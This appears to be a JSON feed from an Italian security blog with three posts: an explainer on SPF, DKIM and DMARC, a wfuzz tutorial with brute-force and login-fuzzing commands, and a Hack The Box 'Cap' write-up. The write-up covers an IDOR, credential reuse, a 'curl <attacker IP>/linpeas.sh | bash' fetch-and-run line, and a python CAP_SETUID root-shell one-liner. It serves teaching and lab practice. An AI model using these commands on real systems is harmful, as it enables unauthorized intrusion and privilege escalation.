{
    "version": "https://jsonfeed.org/version/1",
    "title": "Cybergate Lab",
    "description": "",
    "home_page_url": "https://3nc0d3d.github.io/cybergatelab",
    "feed_url": "https://3nc0d3d.github.io/cybergatelab/feed.json",
    "user_comment": "",
    "icon": "https://3nc0d3d.github.io/cybergatelab/media/website/logoPsyber.jpeg",
    "author": {
        "name": "Alessandro"
    },
    "items": [
        {
            "id": "https://3nc0d3d.github.io/cybergatelab/proteggi-le-tue-email-con-spf-dkim-e-dmarc-anche-se-non-gestisci-il-tuo-server-di-posta.html",
            "url": "https://3nc0d3d.github.io/cybergatelab/proteggi-le-tue-email-con-spf-dkim-e-dmarc-anche-se-non-gestisci-il-tuo-server-di-posta.html",
            "title": "Proteggi le tue Email con SPF, DKIM e DMARC",
            "summary": "Le email sono uno strumento fondamentale per comunicare, ma quando finiscono nello spam o vengono usate in modo fraudolento, possono creare davvero un casino. Personalmente, mi è capitato più volte che delle email importanti finissero nella cartella dello spam – un problema fastidioso che ha&hellip;",
            "content_html": "<p>Le email sono uno strumento fondamentale per comunicare, ma quando finiscono nello spam o vengono usate in modo fraudolento, possono creare davvero un casino. Personalmente, mi è capitato più volte che delle email importanti finissero nella cartella dello spam – un problema fastidioso che ha rallentato le mie comunicazioni e fatto perdere contatti preziosi. Per fortuna, ci sono soluzioni che possono aiutare a proteggere le tue email e il tuo dominio: <strong>SPF</strong>, <strong>DKIM</strong> e <strong>DMARC</strong>.</p><h2 id=\"spf-sender-policy-framework\">SPF: Sender Policy Framework</h2>\n<p><strong>SPF</strong> è un sistema che ti permette di specificare, tramite un record DNS, quali server (cioè quali indirizzi IP) sono autorizzati a inviare email per il tuo dominio. In pratica, quando una email arriva a destinazione, il server ricevente controlla il record SPF per vedere se il mittente è legittimo. Se il tuo IP è autorizzato, l’email viene accettata; altrimenti, rischia di essere rifiutata o etichettata come sospetta.</p><p><strong>Perché è utile anche per chi non gestisce un server proprio?</strong><br>Anche se usi servizi di terze parti (come Gmail, Office 365 o altri provider di posta), puoi e dovresti configurare SPF per il tuo dominio. Questo perché, indipendentemente da chi gestisce il server, il record SPF protegge il nome del tuo dominio, impedendo ad altri di usarlo per inviare spam o phishing.</p><h2 id=\"dkim-domainkeys-identified-mail\">DKIM: DomainKeys Identified Mail</h2>\n<p><strong>DKIM</strong> aggiunge un livello di sicurezza firmando digitalmente le email. In pratica, il tuo server (o il servizio che usi) usa una chiave privata per “firmare” le email, mentre una chiave pubblica, pubblicata nel DNS, permette ai destinatari di verificare che il contenuto non sia stato alterato.</p><p><strong>Anche se non gestisci il tuo server, DKIM è fondamentale.</strong><br>Molti provider di posta includono DKIM nelle loro configurazioni, ma se hai il controllo sul DNS del tuo dominio, puoi sempre assicurarti che il record DKIM sia presente. Così, chi riceve le tue email può essere certo che non sono state manomesse in transito.</p><h2 id=\"dmarc-domain-based-message-authentication-reporting-and-conformance\">DMARC: Domain-based Message Authentication, Reporting and Conformance</h2>\n<p><strong>DMARC</strong> è il “cervello” che mette insieme SPF e DKIM. Con DMARC, puoi dire ai server di posta cosa fare quando un’email non supera i controlli SPF o DKIM: metterla in quarantena o rifiutarla del tutto. Inoltre, DMARC ti manda dei report dettagliati, così puoi monitorare chi sta cercando di inviare email a nome del tuo dominio.</p><p><strong>Non è solo per chi gestisce il proprio server!</strong><br>Anche se usi piattaforme esterne per inviare email, configurare DMARC nel DNS del tuo dominio aiuta a proteggere la tua reputazione online e a mantenere pulita la tua casella di posta. È un modo per avere un controllo in più sulle email che viaggiano con il tuo marchio.</p><h2 id=\"perché-usare-tutti-e-tre-insieme\">Perché usare tutti e tre insieme?</h2>\n<p>Questi strumenti funzionano meglio in combinazione:</p><ul>\n<li><strong>SPF</strong> controlla chi può inviare email per il tuo dominio.</li>\n<li><strong>DKIM</strong> garantisce che il contenuto delle email non venga alterato.</li>\n<li><strong>DMARC</strong> coordina le regole e ti fornisce feedback utili per prevenire abusi.</li>\n</ul>\n<p>Il risultato? Un sistema robusto che protegge il tuo dominio, riduce il rischio di phishing e migliora la consegna delle email, evitando che finiscano nello spam (una situazione che, fidatevi, può diventare davvero frustrante!).</p><h2 id=\"conclusione\">Conclusione</h2>\n<p>Non serve essere un grande amministratore di sistemi per beneficiare di SPF, DKIM e DMARC. Anche se usi servizi di posta gestiti da terzi, configurare questi strumenti a livello di DNS ti permette di proteggere il tuo dominio, migliorare la deliverability delle email e difenderti da tentativi di spoofing. Dalla mia esperienza, evitare che le email importanti finiscano nello spam non solo semplifica la vita quotidiana, ma fa anche sentire più sicuri e in controllo della propria comunicazione.</p><p>Metti in pratica questi consigli e dì addio al problema fastidioso dello spam!</p>",
            "author": {
                "name": "Alessandro"
            },
            "tags": [
                   "spam ",
                   "email",
                   "SPF",
                   "DMARC",
                   "DKIM"
            ],
            "date_published": "2025-02-26T23:53:13+01:00",
            "date_modified": "2025-02-27T19:51:09+01:00"
        },
        {
            "id": "https://3nc0d3d.github.io/cybergatelab/wfuzz-larma-segreta-per-il-fuzzing-di-applicazioni-web.html",
            "url": "https://3nc0d3d.github.io/cybergatelab/wfuzz-larma-segreta-per-il-fuzzing-di-applicazioni-web.html",
            "title": "Wfuzz: L’arma Segreta per il Fuzzing di Applicazioni Web",
            "summary": "Nel mondo della sicurezza informatica, la capacità di testare e mettere alla prova le applicazioni web è fondamentale. Tra gli strumenti più potenti e versatili a disposizione dei professionisti della sicurezza, spicca wfuzz. Ma cos’è esattamente wfuzz e come può essere utilizzato per migliorare la&hellip;",
            "content_html": "\n  <p>\n    Nel mondo della sicurezza informatica, la capacità di testare e mettere alla prova le applicazioni web è fondamentale. Tra gli strumenti più potenti e versatili a disposizione dei professionisti della sicurezza, spicca <strong>wfuzz</strong>. Ma cos’è esattamente wfuzz e come può essere utilizzato per migliorare la sicurezza delle nostre applicazioni web?\n\nIn questo articolo, esploreremo in dettaglio wfuzz, un fuzzer a riga di comando che va ben oltre il semplice directory brute-forcing. Scopriremo come può essere impiegato per una vasta gamma di test di sicurezza, dalla scoperta di aree nascoste all’identificazione di vulnerabilità complesse.\n\n\n  </p>\n\n    <h2 id=\"cose-il-fuzzing\">\n      Cos’è il Fuzzing?\n    </h2>\n\n  <p>\n    \nPrima di immergerci in wfuzz, è utile capire cos’è il “fuzzing”. In termini semplici, il <strong>fuzzing</strong> <em>è una tecnica di test che consiste nell’inviare un gran numero di input inattesi, casuali o malformati ad un sistema (in questo caso, un’applicazione web) per osservare come reagisce</em>. L’obiettivo è individuare comportamenti anomali, errori o crash che potrebbero indicare vulnerabilità di sicurezza.\n\nNel contesto delle applicazioni web, il fuzzing può essere applicato a diverse aree:\n\n\n  </p>\n\n  <ul>\n    <li><strong>URL</strong>: Provare a indovinare directory e file non pubblicamente accessibili.</li><li><strong>Parametri (GET e POST)</strong>: Inviare input inaspettati nei parametri per testare vulnerabilità come SQL Injection o XSS.</li><li><strong>Header HTTP</strong>: Modificare gli header per scoprire funzionalità nascoste o vulnerabilità legate alla gestione degli header.</li><li><strong>Form di autenticazione</strong>: Tentare brute-force su credenziali di accesso.</li>\n  </ul>\n\n    <h2 id=\"wfuzz-il-fuzzer-web-versatile-e-potente\">\n      Wfuzz: Il Fuzzer Web Versatile e Potente\n    </h2>\n\n  <p>\n    \nwfuzz è uno strumento a riga di comando che eccelle proprio in queste attività di fuzzing. È molto più flessibile e potente di strumenti più specifici come gobuster, offrendo un controllo granulare su ogni aspetto delle richieste HTTP e sull’analisi delle risposte.\n\n  </p>\n\n    <h2 id=\"funzionalita-chiave-di-wfuzzlessbrgreater\">\n      Funzionalità Chiave di Wfuzz:<br>\n    </h2>\n\n  <ul>\n    <li><strong>Fuzzing di URL</strong>: Simile al directory brute-forcing, ma con maggiore flessibilità. Permette di sostituire parti dell’URL con parole da una wordlist per scoprire risorse nascoste.</li><li><strong>Fuzzing di Parametri GET e POST:</strong> Permette di inserire payload da wordlist nei parametri delle richieste GET e POST, ideale per testare vulnerabilità di injection e manipolazione dei dati.</li><li><strong>Fuzzing di Header HTTP</strong>: Consente di modificare e fuzzare vari header HTTP, aprendo la strada a test più avanzati e alla scoperta di configurazioni inattese.</li><li><strong>Brute-forcing di Autenticazione</strong>: Può essere utilizzato per tentare attacchi brute-force su form di login, sia Basic Authentication che form basati su password.</li><li><strong>Customizzazione Totale delle Richieste</strong>: Offre un controllo completo sulla creazione delle richieste HTTP, inclusi metodi, header, body, cookie, permettendo test molto mirati.</li><li><strong>Filtraggio Avanzato dei Risultati</strong>: Fornisce opzioni di filtraggio potenti basate su codici di stato, dimensioni della risposta, contenuto, regex, per concentrarsi sui risultati più rilevanti e ridurre il “rumore”.</li><li><strong>Estensibilità con Plugin</strong>: È possibile estendere wfuzz con plugin per adattarlo a scenari di test specifici o aggiungere nuove funzionalità.</li><li><strong>Output in Diversi Formati</strong>: Permette di salvare i risultati in formati come HTML, CSV, JSON e Raw, facilitando l’analisi e la reportistica.</li>\n  </ul>\n\n    <h2 id=\"installare-wfuzz-su-debian-e-sistemi-simili\">\n      Installare Wfuzz su Debian (e Sistemi Simili)\n    </h2>\n\n  <p>\n    Se utilizzi Debian o una distribuzione basata su Debian (come Ubuntu), l’installazione di wfuzz è semplicissima:\n  </p>\n<pre class=\"line-numbers  language-bash\"><code>sudo apt update\nsudo apt install wfuzz\n</code></pre>\n\n  <p>\n    Dopo l’installazione, wfuzz sarà disponibile come comando wfuzz nel tuo terminale.\n  </p>\n\n    <h2 id=\"lessbrgreaterutilizzo-base-di-wfuzz-esempi-pratici\">\n      <br>Utilizzo Base di Wfuzz: Esempi Pratici\n    </h2>\n\n  <p>\n    \nIl cuore di ogni comando wfuzz è la parola chiave <strong>FUZZ</strong>. È questo segnaposto che wfuzz sostituirà con le parole dalla wordlist che specificherai.\nVediamo alcuni esempi di utilizzo comune:\n  </p>\n\n    <h3 id=\"lessbrgreater1-directory-brute-forcing-esplorazione-di-directory-nascostelessbrgreater\">\n      <br>1. Directory Brute-Forcing (Esplorazione di Directory Nascoste):<br>\n    </h3>\n\n  <p>\n    <br>Per eseguire un directory brute-forcing, puoi usare questo comando:<br>\n  </p>\n<pre class=\"line-numbers  language-bash\"><code> wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://www.example.com/FUZZ\n</code></pre>\n\n  <p>\n    <b>-c</b>: Attiva l’output colorato per una migliore leggibilità.<br><b>-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</b>: Specifica la wordlist di directory da utilizzare.<br><b>http://www.example.com/FUZZ: </b>L’URL target&nbsp;<em>FUZZ</em> indica a wfuzz di sostituire “FUZZ” con ogni parola della wordlist.<br>\n  </p>\n\n    <h3 id=\"2-fuzzing-di-parametri-get-test-di-input-e-vulnerabilita\">\n      2. Fuzzing di Parametri GET (Test di Input e Vulnerabilità):\n    </h3>\n\n  <p>\n    Per \"fuzzare\" il parametro query in un URL GET, puoi usare:<br>\n  </p>\n<pre class=\"line-numbers  language-bash\"><code>wfuzz -c -w wordlist.txt \"http://www.example.com/search.php?query=FUZZ\"\n</code></pre>\n\n  <p id=\"wfuzz-inviera-richieste-comelessbrgreater-httpwwwexamplecomsearchphpqueryparola1-httpwwwexamplecomsearchphpqueryparola2lessbrgreater-e-cosi-via-usando-le-parole-dalla-wordlisttxtlessbrgreater3-fuzzing-di-parametri-post-simulazione-di-form\">\n    <b>wfuzz</b> invierà richieste come\n<i>http://www.example.com/search.php?query=parola1</i>, <i>http://www.example.com/search.php?query=parola2</i>, e così via, usando le parole dalla <i>wordlist.txt</i>.\n  </p>\n\n    <h2 id=\"andnbsp3-fuzzing-di-parametri-post-simulazione-di-form\">\n      &nbsp;3. Fuzzing di Parametri POST (Simulazione di Form):\n    </h2>\n\n  <p>\n    \nPer fuzzare il parametro <i>username</i> in una richiesta POST ad un form di login:\n\n  </p>\n<pre class=\"line-numbers  language-bash\"><code>wfuzz -c -w usernames.txt -d \"username=FUZZ&password=password123\" -H \"Content-Type: application/x-www-form-urlencoded\" http://www.example.com/login.php\n</code></pre>\n\n  <ul>\n    <li><span style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: 1em;\"><b>-d “username=FUZZ&amp;password=password123”</b></span><span style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: 1em; font-weight: var(--font-weight-normal);\">: Definisce i dati POST. FUZZ sarà sostituito con ogni username dalla usernames.txt, mentre password rimane fissa.</span><br></li><li><strong>-H “Content-Type: application/x-www-form-urlencoded”</strong>: Imposta l’header corretto per i dati POST di un form HTML.<br></li>\n  </ul>\n\n    <h3 id=\"4-fuzzing-di-header-http-test-di-user-agentlessbrgreater\">\n      4. Fuzzing di Header HTTP (Test di User-Agent):<br>\n    </h3>\n\n  <p>\n    Per testare come il server reagisce a diversi User-Agent:<br>\n  </p>\n<pre class=\"line-numbers  language-bash\"><code>wfuzz -c -w user-agents.txt -H \"User-Agent: FUZZ\" http://www.example.com\n</code></pre>\n\n    <h3 id=\"5-filtraggio-dei-risultati-concentrarsi-sullimportantelessbrgreater\">\n      5. Filtraggio dei Risultati (Concentrarsi sull’Importante):<br>\n    </h3>\n\n  <p>\n    Per nascondere i risultati con codici di stato 404 e 302, puoi usare <b>-hc</b>:<br>\n  </p>\n<pre class=\"line-numbers  language-bash\"><code>wfuzz -c -w wordlist.txt --hc 404,302 http://www.example.com/FUZZ\n# Solo i risultati con codici di stato diversi da 404 e 302 saranno visualizzati, riducendo il rumore.\n</code></pre>\n\n    <h3 id=\"6-salvare-loutput-su-disco-analisi-successivalessbrgreater\">\n      6. Salvare l’Output su Disco (Analisi Successiva):<br>\n    </h3>\n\n  <p>\n    Per salvare i risultati in formato HTML nel file risultati_directory.html:<br>\n  </p>\n<pre class=\"line-numbers  language-bash\"><code>wfuzz -c -w wordlist.txt -o html,risultati_directory.html http://www.example.com/FUZZ\n# Puoi sostituire html con csv, json o raw per altri formati di output.\n</code></pre>\n\n    <h3 id=\"considerazioni-fondamentali-per-un-utilizzo-responsabilelessbrgreater\">\n      Considerazioni Fondamentali per un Utilizzo Responsabile:<br>\n    </h3>\n\n  <ul>\n    <li><b>Etica e Legalità</b>: Utilizza wfuzz solo su siti web di cui hai il permesso di testare la sicurezza. Le scansioni non autorizzate sono illegali e non etiche.</li><li><b>Impatto sul Server</b>: Il fuzzing intensivo può sovraccaricare i server. Utilizza wfuzz con responsabilità, limitando i thread (-t) e usando ritardi (--delay) se necessario.</li><li><b>Qualità della Wordlis</b>t: L’efficacia di wfuzz dipende fortemente dalla wordlist. Scegli wordlist appropriate per il tipo di test.<br></li>\n  </ul>\n\n    <h3 id=\"conclusione-wfuzz-uno-strumento-indispensabilelessbrgreater\">\n      Conclusione: Wfuzz, Uno Strumento Indispensabile<br>\n    </h3>\n\n  <p>\n    wfuzz è uno strumento potente e flessibile per il fuzzing di applicazioni web. La sua versatilità, le opzioni di customizzazione e filtraggio, e la capacità di salvare l’output lo rendono un componente essenziale per chiunque si occupi di sicurezza informatica e desideri testare a fondo la robustezza delle applicazioni web.<br><br>Inizia a sperimentare con gli esempi base, esplora la vasta gamma di opzioni di wfuzz (consulta wfuzz –help per la guida completa) e scopri come questo strumento può aiutarti a migliorare la sicurezza delle tue applicazioni web!\n  </p>",
            "author": {
                "name": "Alessandro"
            },
            "tags": [
            ],
            "date_published": "2025-02-15T17:24:55+01:00",
            "date_modified": "2025-02-15T22:31:12+01:00"
        },
        {
            "id": "https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html",
            "url": "https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html",
            "title": "Exploit della Macchina Cap di HTB",
            "summary": "Introduzione Cap è una macchina Linux a bassa difficoltà progettata per test di sicurezza. Al suo interno è presente un server HTTP dedicato ad attività amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilità IDOR (Insecure Direct Object&hellip;",
            "content_html": "<h1 id=\"introduzione\">Introduzione</h1>\n<p>Cap è una macchina Linux a bassa difficoltà progettata per test di sicurezza. Al suo interno è presente un server HTTP dedicato ad attività amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilità <strong>IDOR</strong> (Insecure Direct Object Reference) abbia permesso di accedere a dati sensibili e di ottenere privilegi root tramite escalation.</p><h1 id=\"cosè-lidor\">Cos’è l’IDOR?</h1>\n<p>L’IDOR è una <em>vulnerabilità che si verifica quando un’applicazione espone riferimenti diretti a oggetti interni (es. ID di record, file) senza controllare i permessi dell’utente</em>. Ciò consente a un attaccante di manipolare tali riferimenti per accedere a risorse non autorizzate.</p><h2 id=\"esempio-pratico\">Esempio Pratico</h2>\n<p>Supponiamo un URL come:</p><pre><code>http://esempio.com/documento/123\n</code></pre>\n<p>Se l’applicazione non verifica che l’utente abbia i diritti per accedere al documento con ID 123, modificando questo valore (es. 124) si potrebbe accedere a documenti altrui.</p><h2 id=\"rischi-associati\">Rischi Associati</h2>\n<ul>\n<li>Esposizione di dati sensibili.</li>\n<li>Manipolazione di risorse critiche.</li>\n<li>Difficoltà di individuazione (bassa visibilità).</li>\n</ul>\n<h2 id=\"prevenzione\">Prevenzione</h2>\n<ul>\n<li>Implementare controlli di accesso granulari.</li>\n<li>Utilizzare identificatori non prevedibili (es. UUID).</li>\n<li>Validare e sanificare gli input.</li>\n<li>Loggare le attività sospette.</li>\n</ul>\n<h2 id=\"la-vulnerabilità-nella-macchina-cap\">La Vulnerabilità nella Macchina Cap</h2>\n<p>L’applicazione web di Cap permetteva il download di file PCAP (acquisizioni di traffico di rete) tramite URL come:</p><pre><code>http://10.10.10.56/data/2\n</code></pre>\n<p>Modificando l’ID (2, 3, ecc.), era possibile scaricare PCAP appartenenti ad altri utenti, sfruttando proprio un IDOR.</p><h2 id=\"fasi-dellattacco\">Fasi dell’Attacco</h2>\n<h3 id=\"1-scansione-iniziale\">1. Scansione Iniziale</h3>\n<p>Dopo aver configurato la VPN per accedere alla macchina, ho utilizzato <strong>nmap</strong> per identificare le porte aperte:</p><pre><code>nmap -sV 10.10.10.56\n</code></pre>\n<p>Risultato:</p><pre><code>Porta 21 (FTP), 22 (SSH), 80 (HTTP).\n</code></pre>\n<h3 id=\"2-exploit-dellidor\">2. Exploit dell’IDOR</h3>\n<p>Modificando l’ID nell’URL (es. <a href=\"http://10.10.10.56/data/3\">http://10.10.10.56/data/3</a>), ho scaricato diversi file PCAP.</p><h3 id=\"3-analisi-con-wireshark\">3. Analisi con Wireshark</h3>\n<p>Uno dei file PCAP conteneva una connessione FTP non cifrata, con credenziali in chiaro:</p><pre><code>User: nathan  \nPassword: Bu......F0RM3!\n</code></pre>\n<h3 id=\"4-accesso-ssh\">4. Accesso SSH</h3>\n<p>Le stesse credenziali erano valide per il servizio SSH:</p><pre><code>ssh nathan@10.10.10.56\n</code></pre>\n<h2 id=\"privilege-escalation-da-utente-a-root\">Privilege Escalation: Da Utente a Root</h2>\n<h3 id=\"1-ricerca-di-vulnerabilità-con-linpeas\">1. Ricerca di Vulnerabilità con linPEAS</h3>\n<hr>\n<h4 id=\"cosè-linpeas-linux-privilege-escalation-awesome-script\">Cos’è linPEAS (linux Privilege Escalation Awesome Script)</h4>\n<p><em>linPEAS identifica potenziali vettori di escalation dei privilegi e vulnerabilità all’interno di un sistema linux lo script si occupa di:</em></p><ul>\n<li><em>verifica della configurazione e dei permessi di file critici</em></li>\n<li><em>dentificazione di servizi in esecuzione e processi potenzialmente insicuri.</em></li>\n<li><em>raccolta di informazioni su software installati, configurazioni di rete e possibili errori di configurazione.</em></li>\n<li><em>Analisi di eventuali debolezze nei meccanismi di autenticazione e autorizzazione.</em></li>\n</ul>\n<hr>\n<p>Dopo aver ottenuto l’accesso come nathan, ho trasferito lo script linPEAS per individuare vettori di escalation:</p><p>Avvio di un server HTTP in locale:</p><pre><code>python -m http.server 80\n</code></pre>\n<p>Esecuzione di linPEAS sul target:</p><pre><code>curl http://&lt;IP_ATTACCANTE&gt;/linpeas.sh | bash\n</code></pre>\n<h3 id=\"2-individuazione-del-vettore-critico\">2. Individuazione del Vettore Critico</h3>\n<p>Lo script ha evidenziato che l’eseguibile python3.8 possedeva il capability <strong>CAP_SETUID</strong>:</p><pre><code>/usr/bin/python3.8 = cap_setuid+ep\n</code></pre>\n<p>Questa capability consente a Python di modificare l’UID del processo, permettendo di impersonare root, per cui possiamo eseguire da python una shell come root.</p><h3 id=\"3-exploit-finale\">3. Exploit Finale</h3>\n<p>Per ottenere una shell root, ho eseguito:</p><pre><code>import os\nos.setuid(0)\nos.system(&quot;/bin/bash&quot;)\n</code></pre>\n<p>Esecuzione:</p><pre><code>python3.8 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;\n</code></pre>\n<p>Risultato: Accesso come root! 🔑</p><h2 id=\"conclusioni\">Conclusioni</h2>\n<p>La macchina Cap dimostra due rischi critici:</p><ul>\n<li>IDOR: L’assenza di controlli sugli ID ha permesso l’accesso a dati altrui.</li>\n<li>Capability Pericolose: Assegnare capability come CAP_SETUID a interpreti (es. Python) può portare a escalation catastrofiche.</li>\n</ul>\n<h2 id=\"best-practice\">Best Practice</h2>\n<ul>\n<li>Limitare l’uso di capability ai soli processi necessari.</li>\n<li>Revisionare periodicamente i permessi dei file.</li>\n<li>Adottare il principio del minimo privilegio.</li>\n<li>Questo caso sottolinea l’importanza di un’igiene di sicurezza rigorosa, sia nel codice che nella configurazione di sistema.</li>\n</ul>\n",
            "author": {
                "name": "Alessandro"
            },
            "tags": [
            ],
            "date_published": "2025-02-11T17:22:00+01:00",
            "date_modified": "2025-02-15T19:17:35+01:00"
        }
    ]
}
